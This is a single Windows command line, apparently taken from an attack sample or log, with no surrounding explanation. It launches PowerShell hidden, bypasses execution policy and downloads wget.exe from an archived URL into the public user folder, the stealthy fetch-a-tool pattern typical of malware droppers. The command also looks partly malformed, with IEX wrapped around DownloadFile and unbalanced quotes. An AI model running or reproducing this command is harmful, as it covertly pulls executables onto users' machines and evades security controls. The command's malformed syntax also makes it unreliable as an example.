cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://web.archive.org/web/20190817130225/https://eternallybored.org/misc/wget/1.20.3/32/wget.exe',\"$env:PUBLIC\wget.exe\")
